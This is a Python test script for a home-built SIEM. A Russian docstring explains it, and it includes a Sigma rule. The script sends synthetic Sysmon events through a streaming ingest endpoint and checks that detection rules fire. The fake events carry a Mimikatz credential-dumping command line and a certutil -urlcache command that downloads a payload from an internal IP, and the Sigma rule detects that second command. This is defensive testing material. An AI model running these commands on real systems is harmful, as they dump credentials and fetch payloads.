r"""
Проверка "Основного рулсета" (app/main_ruleset.py) через ПОТОКОВЫЙ ingest (POST /ingest/stream +
IngestWorker, см. app/ingest_queue.py) - именно этот путь до недавнего времени не давал выбрать
ruleset вообще и всегда бил в дефолтный движковый rules_windows_merged.json; теперь он ВСЕГДА
использует main ruleset (см. _process_events в app/main.py). Скрипт шлёт NDJSON-события двумя
пачками так, чтобы сработали:
    1. builtin-правило из rules_windows_merged.json ("HackTool - Mimikatz Execution - Sysmon",
       простое условие: Channel=Sysmon + EventID=1 + CommandLine LIKE '%mimikatz%' и т.п.);
    2. кастомное правило ниже (LOLBIN-детект certutil -urlcache).

Как пользоваться:
    1. Убедись, что в основной рулсет добавлен ЦЕЛИКОМ rules_windows_merged.json (вкладка
       Sigma-правила -> выбрать его в селекторе -> кнопка "+ Добавить рулсет в основной").
    2. Вставь YAML ниже целиком во вкладке Sigma-правила -> "+ Написать своё правило" ->
       укажи существующий свой рулсет ИЛИ создай новый -> "Скомпилировать и сохранить".
    3. Добавь это правило в основной рулсет: найди его в списке (тот рулсет, куда сохранил на
       шаге 2) и нажми "+" в колонке слева от строки правила (или включи toggle "Только
       основной рулсет", чтобы проверить, что его там ещё нет).
    4. Запусти сервис (uvicorn app.main:app --port 8000), если ещё не запущен.
    5. Запусти этот скрипт: python scripts/stream_main_ruleset_test.py
       Он шлёт события через /ingest/stream (асинхронно, очередь+микробатч, см.
       app/ingest_queue.py), затем ждёт флаша (SIEM_INGEST_FLUSH_INTERVAL, дефолт 5с) и
       поллит /alerts?source_batch=... пока не появятся алерты (таймаут 30с).
    6. Проверь вкладку "Алерты" с source_batch, который скрипт напечатает - должны быть алерты
       и на builtin-правило (Mimikatz), и на кастомное (Certutil). Если основной рулсет ещё
       пуст/не настроен по шагам 1-3 - алертов не будет вообще (стрим больше не использует
       rules_windows_merged.json напрямую, см. app/main_ruleset.py).

Кастомное правило (Sigma YAML, вставить в UI как есть):

```yaml
title: Suspicious Certutil URLCache Download (SOC Agent Stream Test)
id: 9f2c1a3e-7b5d-4e8f-9a2b-3c4d5e6f7081
status: experimental
description: Detects certutil.exe used with -urlcache/urlcache to download a remote payload - classic LOLBIN staging technique (T1105).
author: soc_agent test
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_cli:
    CommandLine|contains: 'urlcache'
  condition: selection_img and selection_cli
level: high
falsepositives:
  - Legitimate certificate management scripts using certutil
tags:
  - attack.command_and_control
  - attack.t1105
```

Условие: Image заканчивается на "\certutil.exe" И CommandLine содержит "urlcache" - оба
селектора обязательны (and), поэтому контрольное событие ниже намеренно ломает ровно один
из двух признаков (certutil.exe без urlcache в командной строке).
"""
from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from uuid import uuid4

DEFAULT_URL = "http://localhost:8000"
SOURCE_LABEL = "main-stream-test"

_MIMIKATZ_CMDLINE = "mimikatz.exe sekurlsa::logonpasswords exit"
_CERTUTIL_MATCH_CMDLINE = "certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe payload.exe"
_CERTUTIL_NONMATCH_CMDLINE = "certutil.exe -hashfile payload.exe SHA256"  # certutil.exe есть, urlcache - нет


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


def _event(host: str, image: str, command_line: str, event_id: int = 1) -> dict:
    return {
        "EventID": event_id,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "EventTime": _now(),
        "Hostname": host,
        "Image": image,
        "CommandLine": command_line,
        "ProcessId": 1000 + hash(command_line) % 8000,
    }


def build_events() -> list[dict]:
    matching = [
        # -> "HackTool - Mimikatz Execution - Sysmon" (builtin, rules_windows_merged.json) -
        # условие: Channel=Sysmon, EventID=1, CommandLine LIKE '%sekurlsa::%' (среди прочих).
        # Реалистично матчит и ряд других generic-правил в merged (mimikatz - популярная сигнатура).
        _event("WORKSTATION1.theshire.local",
               "C:\\Users\\Public\\mimikatz.exe", _MIMIKATZ_CMDLINE),
        # -> кастомное "Suspicious Certutil URLCache Download" (см. докстринг выше).
        _event("MORDORDC.theshire.local",
               "C:\\Windows\\System32\\certutil.exe", _CERTUTIL_MATCH_CMDLINE),
    ]
    non_matching = [
        # certutil.exe есть, но БЕЗ "urlcache" в командной строке - кастомное правило не должно
        # сработать (selection_cli не выполняется).
        _event("WORKSTATION2.theshire.local",
               "C:\\Windows\\System32\\certutil.exe", _CERTUTIL_NONMATCH_CMDLINE),
        # Полностью не по теме - контрольное "шумовое" событие.
        _event("WORKSTATION3.theshire.local",
               "C:\\Windows\\System32\\whoami.exe", "whoami.exe /all"),
    ]
    return matching + non_matching


def _post_stream(url: str, source: str, events: list[dict]) -> dict | None:
    body = "\n".join(json.dumps(e, default=str) for e in events).encode("utf-8")
    req = urllib.request.Request(
        f"{url}/ingest/stream?{urllib.parse.urlencode({'source': source})}",
        data=body,
        method="POST",
        headers={"Content-Type": "application/x-ndjson"},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode("utf-8", errors="replace")
        print(f"Ошибка HTTP {exc.code}: {detail}", file=sys.stderr)
        sys.exit(1)
    except urllib.error.URLError as exc:
        print(f"Ошибка соединения: {exc.reason}", file=sys.stderr)
        sys.exit(1)


def _get_json(url: str) -> dict | list:
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _wait_for_flush(url: str, timeout: float = 15.0) -> None:
    """Ждёт, пока фоновый воркер очереди (app/ingest_queue.py) сбросит буфер - иначе алертов
    ещё физически не может быть в БД. Печатает queue_size, чтобы было видно прогресс."""
    print("Жду флаша очереди ingest...")
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        try:
            health = _get_json(f"{url}/health?detailed=true")
            q = health["checks"]["ingest_queue"]
            print(f"  queue_size={q['queue_size']} worker_alive={q['worker_alive']}")
            if q["queue_size"] == 0:
                time.sleep(0.5)  # небольшой запас на завершение самого _process_events после флаша
                return
        except Exception as exc:  # noqa: BLE001 - диагностика не должна ронять скрипт
            print(f"  не удалось получить статус очереди: {exc}")
        time.sleep(1.0)
    print("  таймаут ожидания флаша - очередь могла не опустеть, проверяю алерты как есть")


def _poll_alerts(url: str, source_batch: str, timeout: float = 30.0) -> list[dict]:
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        alerts = _get_json(f"{url}/alerts?{urllib.parse.urlencode({'source_batch': source_batch})}")
        if alerts:
            return alerts
        time.sleep(1.5)
    return []


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
    source = f"{SOURCE_LABEL}-{uuid4().hex[:6]}"
    events = build_events()

    print(f"Отправляю {len(events)} события в /ingest/stream (source={source!r}) -> {url}")
    res = _post_stream(url, source, events)
    print(f"202 Accepted: queued={res.get('queued') if res else '?'}")

    _wait_for_flush(url)

    alerts = _poll_alerts(url, source)
    if not alerts:
        print(
            "\nАлертов не появилось. Проверь:\n"
            "  - rules_windows_merged.json добавлен ЦЕЛИКОМ в основной рулсет (шаг 1);\n"
            "  - кастомное правило из докстрайна сохранено И добавлено в основной рулсет (шаги 2-3);\n"
            "  - сервис вообще запущен и /ingest/stream доступен."
        )
        sys.exit(1)

    print(f"\nПолучено алертов: {len(alerts)} (source_batch={source})")
    for a in alerts:
        print(f"  - [{a.get('rule_level', '?')}] {a.get('rule_title', '?')} "
              f"host={a.get('host', '?')} event_count={a.get('event_count', '?')}")
    print(f"\nПроверь вкладку Алерты/События с источником '{source}'.")


if __name__ == "__main__":
    main()
